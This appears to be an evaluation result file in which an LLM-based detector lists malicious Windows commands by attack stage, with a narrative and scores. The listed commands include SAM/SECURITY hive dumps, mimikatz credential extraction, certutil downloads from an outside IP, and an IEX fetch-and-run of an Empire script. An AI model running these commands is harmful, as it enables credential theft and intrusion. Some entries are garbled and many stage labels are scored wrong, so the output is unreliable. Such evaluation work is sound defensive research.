@@ -1,0 +1,163 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\\u0534\ufffd",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Star t-Process .\\T1059.003_script.bat\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "schtasks /delete /tn test /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wmic computersystem get domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\\\system32\\\\calc.exe\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "reg exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg exe save hklm\\system c:\\users\\admini~1\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg exe save hklm\\sam c:\\users\\admini~1\\appdata\\local\\temp\\tthwwf",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \"domain admins\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"wmi win32_service call CreateService\", \"name\":\"atbroker\",\"displayname\":\"AtBroker\",\"pathname\": \"cmd.exe\",\"arguments\":\"/c echo Hey!\" ,\"startmode\":\"auto\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C \"netstat -an  \"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "rundll32.exe user32.dll,LockWorkStation",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"tor.lnk\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz.exe LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attacks detected involve initial access gained through various means, including Invoke-WMIPowerShell and CertUtil, followed by persistence achieved through scheduled tasks. Subsequently, the attackers escalated privileges by manipulating registry keys, creating system files, and downloading malicious payloads. They conducted discovery operations to learn about the target environment and performed defense evasion tactics such as URL cache modification, lock workstation creation, and network proxy setup. Lateral movement occurred through command execution via Tor links, while credential access was obtained using Mimikatz. Command and control communication took place via HTTP, HTTPS, and VBScript-encoded web scripts.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 88236,
+      "completion_tokens": 7449,
+      "total_tokens": 95685,
+      "wall_clock_s": 109.889,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.35714285714285715,
+      "recall": 0.5263157894736842,
+      "f1": 0.425531914893617,
+      "tp": 10,
+      "fp": 18,
+      "fn": 9
+    },
+    "stage": {
+      "precision": 0.14285714285714285,
+      "recall": 0.17391304347826086,
+      "f1": 0.1568627450980392,
+      "tp": 4,
+      "fp": 24,
+      "fn": 19,
+      "recall_partial": 0.391304347826087
+    },
+    "hallucination_rate": 0.09090909090909091,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 88236,
+      "completion_tokens": 7449,
+      "total_tokens": 95685,
+      "wall_clock_s": 109.889,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
